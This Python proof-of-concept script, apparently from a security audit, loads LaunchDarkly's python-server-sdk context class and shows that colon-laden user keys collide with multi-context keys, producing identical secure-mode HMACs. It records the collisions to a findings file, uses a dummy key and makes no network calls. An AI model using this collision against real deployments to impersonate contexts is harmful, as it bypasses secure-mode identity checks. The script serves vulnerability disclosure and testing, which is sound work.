#!/usr/bin/env python3
"""
PoC (Python) — same canonicalKey collision, proved with the REAL python-server-sdk class.

Loads sdk/python-server-sdk/ldclient/context.py unmodified (it is stdlib-only) and shows that a
single-kind `user` context and a multi-context can produce the SAME fully_qualified_key, hence the
SAME secure-mode HMAC — which is what the client-side `h` parameter is validated against.

Companion to tools/poc-canonicalkey-collision.js (node-server-sdk + js-core).

Usage: python3 tools/poc-canonicalkey-collision.py [outDir]
No network. No credentials.
"""
import hashlib
import hmac
import importlib.util
import json
import os
import sys

REPO = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..')
CTX_PY = os.path.join(REPO, 'sdk', 'python-server-sdk', 'ldclient', 'context.py')
OUT = sys.argv[1] if len(sys.argv) > 1 else os.path.join(REPO, 'findings', 'F-002-canonicalkey-collision')
os.makedirs(OUT, exist_ok=True)

if not os.path.exists(CTX_PY):
    sys.exit(f"missing {CTX_PY}\n  git clone --depth 1 https://github.com/launchdarkly/python-server-sdk sdk/python-server-sdk")

spec = importlib.util.spec_from_file_location('ld_context_real', CTX_PY)
mod = importlib.util.module_from_spec(spec)
spec.loader.exec_module(mod)
Context = mod.Context

lines = []
def say(s=''):
    lines.append(s)
    print(s)

DEMO_KEY = b'sdk-00000000-0000-0000-0000-000000000000'  # dummy; any key shows the equality

say('# canonicalKey / fully_qualified_key collision — python-server-sdk (real SDK class)')
say(f'source: {os.path.relpath(CTX_PY, REPO)}')
say('')

pairs = [
    # (single-kind user context, colliding multi-context)
    ('org:o1:user:u1', [('org', 'o1'), ('user', 'u1')]),
    ('session:1234:user:5678', [('session', '1234'), ('user', '5678')]),
    ('device:abc:user:xyz', [('device', 'abc'), ('user', 'xyz')]),
    # three-kind collision
    ('org:o1:team:t1:user:u1', [('org', 'o1'), ('team', 't1'), ('user', 'u1')]),
]

collisions = 0
for user_key, multi_parts in pairs:
    A = Context.create(key=user_key, kind='user')
    B = Context.create_multi(*[Context.create(key=k, kind=kd) for kd, k in multi_parts])
    fqk_a, fqk_b = A.fully_qualified_key, B.fully_qualified_key
    h_a = hmac.new(DEMO_KEY, fqk_a.encode(), hashlib.sha256).hexdigest()
    h_b = hmac.new(DEMO_KEY, fqk_b.encode(), hashlib.sha256).hexdigest()
    eq = fqk_a == fqk_b
    collisions += eq
    say(f'A = single-kind user context   key={user_key!r}')
    say(f'B = multi-context              {json.dumps({kd: k for kd, k in multi_parts})}')
    say(f'   A.fully_qualified_key = {fqk_a!r}')
    say(f'   B.fully_qualified_key = {fqk_b!r}')
    say(f'   COLLISION = {eq}   identical secure-mode HMAC = {h_a == h_b}')
    if eq:
        say(f'   hmac = {h_a}')
    say('')

say(f'collisions: {collisions}/{len(pairs)}')
say('')

# the secondary vector (':' inside a KIND) is blocked by SDK-side kind validation — record it
bad = Context.create(key='d', kind='a:b:c')
say(f"secondary vector — kind 'a:b:c': error = {bad.error!r}")
say('  (kind names are validated, so the exploitable asymmetry is the un-escaped *key* of a')
say("   'user'-kind context; keys are free-form strings and are not validated for colons)")
say('')

# what the escaping rule is, quoted from the SDK itself
say('the escaping rule as implemented (context.py):')
say("  _escape_key_for_fully_qualified_key: key.replace('%', '%25').replace(':', '%3A')")
say("  single kind: full_key = key if kind == DEFAULT_KIND else '%s:%s' % (kind, escape(key))")
say("  multi kind : ':'.join(kind + ':' + escape(key) for each kind, sorted by kind)")
say("  -> escape() is skipped exactly when kind == 'user', while multi-context keys ARE escaped.")
say('     Any user key of the form "<kind1>:<key1>:<kind2>:<key2>" therefore impersonates a')
say('     multi-context (and vice versa) for every consumer of fully_qualified_key: secure-mode')
say('     HMAC, event/context deduplication and cache keys.')

with open(os.path.join(OUT, 'poc-output-python.txt'), 'w') as f:
    f.write('\n'.join(lines) + '\n')
say('')
say(f'written: {os.path.join(OUT, "poc-output-python.txt")}')
